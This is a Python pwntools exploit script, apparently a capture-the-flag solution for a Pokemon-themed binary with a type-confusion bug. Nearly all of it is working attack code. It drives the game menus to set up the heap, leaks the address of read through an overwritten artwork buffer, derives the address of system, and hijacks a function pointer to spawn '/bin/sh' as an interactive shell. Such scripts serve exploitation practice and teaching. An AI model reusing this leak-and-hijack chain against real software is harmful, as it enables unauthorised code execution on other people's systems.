#!/usr/bin/python

from pwn import *

read_plt = p32(0x8048512)

def grass(p):
    for _ in range(2):
        p.recvuntil('artwork\n')
        p.sendline(b'1')

def kakuna_catch(p, num):
    grass(p)

    # Kakuna appears!
    p.recvuntil('Run\n')
    p.sendline(b'2') #Catch it

    # Name it
    p.recvuntil('Pokemon?\n')
    p.sendline(f'useless{num}')

def kakuna_trash(p):
    grass(p)

    # Kakuna appears!
    p.recvuntil('Run\n')
    p.sendline(b'3') #Trash it

def charizard_catch(p):
    p.recvuntil('artwork\n')
    p.sendline(b'1')

    # Charizard appears!
    # Need to whittle this one down a bit...
    for _ in range(4):
        p.recvuntil('Run\n')
        p.sendline(b'1') #Attack!

    p.recvuntil('Run\n')
    p.sendline(b'2') #Catch it

    # Name it
    p.recvuntil('Pokemon?\n')
    p.sendline('/bin/sh\0')

    # Replace
    p.recvuntil('useless3\n')
    p.sendline(b'2')

def replace_art_leak(p):
    p.recvuntil('artwork\n')
    p.sendline(b'5') # Change art

    p.recvuntil('useless3\n')
    p.sendline(b'2') # Charizard

    buff_size = 0x869
    kakuna_print = p32(0x8048766)
    preamble_len = 0x1fd
    preamble = b'A'*preamble_len + read_plt
    filler_len = buff_size - preamble_len - len(kakuna_print)

    p.sendline(preamble + kakuna_print + b'B'*filler_len)

    # Get leak
    p.recvuntil('artwork\n')
    p.sendline(b'3')

    p.recvuntil(b'Attack:')
    p.recvuntil(b'Attack:')
    data = p.recvline().strip()
    data = u32(data[0:4])

    return data

def replace_art_exploit(p, system):
    p.recvuntil('artwork\n')
    p.sendline(b'5') # Change art

    p.recvuntil('useless3\n')
    p.sendline(b'2') # Charizard

    buff_size = 0x869
    kakuna_print = p32(system)
    preamble_len = 0x1fd
    preamble = b'A'*preamble_len + read_plt
    filler_len = buff_size - preamble_len - len(kakuna_print)

    p.sendline(preamble + kakuna_print + b'B'*filler_len)

def exploit(p):
    ''''''
    for i in range(4): #Catch 4 kakuna's
        kakuna_catch(p, i)

    for _ in range(2): #Trash 2 kakuna's
        kakuna_trash(p)

    charizard_catch(p)
    read_leak = replace_art_leak(p)

    system = read_leak - 0xc2000
    replace_art_exploit(p, system)

#p = process(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'])
p = gdb.debug(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'],'''
c            
''')

exploit(p)

p.interactive()